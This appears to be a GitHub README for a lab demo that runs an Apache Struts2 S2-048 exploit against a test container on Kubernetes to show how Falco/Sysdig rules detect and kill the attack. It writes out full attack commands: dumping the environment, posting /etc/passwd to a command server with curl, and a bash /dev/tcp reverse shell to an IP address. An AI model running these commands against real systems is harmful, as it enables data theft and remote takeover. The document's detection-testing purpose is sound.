# struts_poc  
all credit to https://github.com/hook-s3c/apache-struts2-PoC, all I did is add a few things, bring it to life a bit more, EKS, etc.

![image](https://user-images.githubusercontent.com/4404271/153259381-52907b2b-ab78-4699-bde6-0cf7b35393a8.png)

There are sometimes holes in our runtimes. This is nothing more than good old Kali struts poc rev shell in a k8s cluster. Simple.  
![image](https://user-images.githubusercontent.com/4404271/155650062-66a0d0e0-5091-4dd0-9eb9-cb125d21dddb.png)

`Hints to get this working yourself:`    

git clone https://github.com/hook-s3c/apache-struts2-PoC  
cd apache-struts2-PoC/  
docker build -t struts .  
docker run -it --rm -d -p 8080:8080 struts:latest  
docker tag struts:latest public.ecr.aws/v9f6i2g3/stuff:latest  

#public login to us-west-2 not supported by aws, no worries it's supported in us-east-1 so let's just do it there ;-)  

aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws  
docker push public.ecr.aws/v9f6i2g3/stuff:latest  
kubectl apply -f strust-deploy-and-service.yaml  
ubuntu@brett-jumpbox:myhomedir/apache-struts2-PoC  
  
kubectl get service -n struts  
NAME     TYPE           CLUSTER-IP       EXTERNAL-IP                                                              PORT(S)          AGE  
struts   LoadBalancer   10.100.144.108   12345.us-west-2.elb.amazonaws.com   8080:30524/TCP   153m

`Step 1`  

OK now we can attack, from the attacker "box" (actually just a tmux on my ubuntu box):  

cd ~/apache-struts2-PoC  
python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'env'  

...and we dump the environment from our struts box, to our attacker "box" and see it on STDOUT... not good!  

KUBERNETES_SERVICE_PORT_HTTPS=443  
KUBERNETES_SERVICE_PORT=443  
STRUTS_PORT_8080_TCP_PORT=8080  
STRUTS_SERVICE_PORT=8080  
HOSTNAME=struts-7d8c95bbbd-9p9pp  
JAVA_HOME=/usr/local/openjdk-8  
GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42
etc..  


`Step 2`  
First, on the cc server, start some simple web server (you can find it in this repo) such as: 

python3 webserver.py  

`Step 3`  

Now let us force our exploitable struts instance to reach out to our webserver like this:  

python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'curl jumpbox.brett1.com:8080/hi_from_inside_the_container_in_our_cluster'

So that is an HTTP GET method. We can imagine, a workload needs to update or get some file, it may be permissable to let it do a GET, but we want to know when this happens.  
So, I wondered if I could modify an existing Falco rule to warn on curl GET? Yes! 
![image](https://user-images.githubusercontent.com/4404271/155773758-cf712d92-c7f1-42e9-913f-d34c5c2fd1b2.png)
![image](https://user-images.githubusercontent.com/4404271/155773836-8430f346-1858-41a6-ac30-5f589bb930da.png)


So, as you can see above, Falco allows us to get granular enough to tell the difference between a curl POST and a curl GET <Borat>very nice!</Borat>  
So, this GET shows up on our little CC web server, and logs in Sysdig Events as a warning about curl, naughty, but I'll allow it, this time!  

![image](https://user-images.githubusercontent.com/4404271/155774031-a30a2755-7851-4cbb-95b3-30c231ab38fd.png)
![image](https://user-images.githubusercontent.com/4404271/155774091-c6d9dcd4-939c-43a7-a981-0128516feace.png)

Here you can see Sysdig agent running in our EKS cluster warns on curl GET, but allows it:  
![image](https://user-images.githubusercontent.com/4404271/155774256-163a9e44-3f0f-41b4-bc9c-3b37e4ef7039.png)

`Step 4`  

OK now with our confidence sky high, through the roof, let's do a curl POST to send the passwd file to our CC server here we go:  
(But first, we must turn off our Sysdig policy to block POST or else we will never see it work)  
![image](https://user-images.githubusercontent.com/4404271/155774448-99285ef4-027f-43a8-b4bc-8712f9540372.png)

python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'curl -d @/etc/passwd jumpbox.brett1.com:8080'

And believe me, that works! We see the passwd file appearing in our CC server.  
![image](https://user-images.githubusercontent.com/4404271/155774611-879cc683-20db-4454-93df-2dab0de3eaab.png)
![image](https://user-images.githubusercontent.com/4404271/155774632-a9f44814-7eb7-4e11-87ed-407cdc604266.png)

OK this is beyond the pale, we cannot allow this.  
So we simply toggle our curl POST policy to ON, this has the Falco rule to fire iif there is a curl POST,  
and has an action to kill the container:  
![image](https://user-images.githubusercontent.com/4404271/155774866-38990415-0101-43f1-a6ab-8090bfd2f1fb.png)

here is that Falco rule - it is identical to the one for the curl GET, just without the NOT negation:  
![image](https://user-images.githubusercontent.com/4404271/155775341-b22453cb-bb5b-4448-9f15-1d79bbe4d170.png)

And it works! The container is killed so quickly, the passwd never shows up on the CC server (I know, I tested it probably a hundred times, and I have a replica set of two apache struts containers behind my LoadBalancer )  
![image](https://user-images.githubusercontent.com/4404271/155775568-61d26d3e-4cfe-4c52-b914-afc3101079b0.png)

Here you see my first instance was selected by the LoadBalancer target group, and also, my second instance.  You can see the restarts and you can see the one instance is in error when I make this screenshot:  

![image](https://user-images.githubusercontent.com/4404271/155775818-dde27d24-5e23-4650-a3ce-d0794628db26.png)

and here you can see, nothing ever appears on my CC server, no passwd file is POSTed:  
![image](https://user-images.githubusercontent.com/4404271/155776198-0e438449-c168-4308-9fc3-38f26b9109f0.png)



`Step 5`  

So now to put the cherry on top, let's do a reverse shell:  
On our CC server let's just listen like so: nc -l 4242  

And then from our attack box let's do it:  
python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'bash -i >& /dev/tcp/52.206.9.54/4242 0>&1'

And if you like to watch animations here we are:  

![struts_rs](https://user-images.githubusercontent.com/4404271/153033823-b0d10a6b-4faa-4f0e-b8d1-8dde69cf1562.gif)

![image](https://user-images.githubusercontent.com/4404271/153435925-60ccd750-ad11-4f80-ad72-e27f01d75e09.png)

![image](https://user-images.githubusercontent.com/4404271/153497163-7b424dc2-3652-4798-9200-1606fd54876f.png)

![image](https://user-images.githubusercontent.com/4404271/153490296-a07fb685-8b04-48bb-8af0-7bff11cc2c21.png)

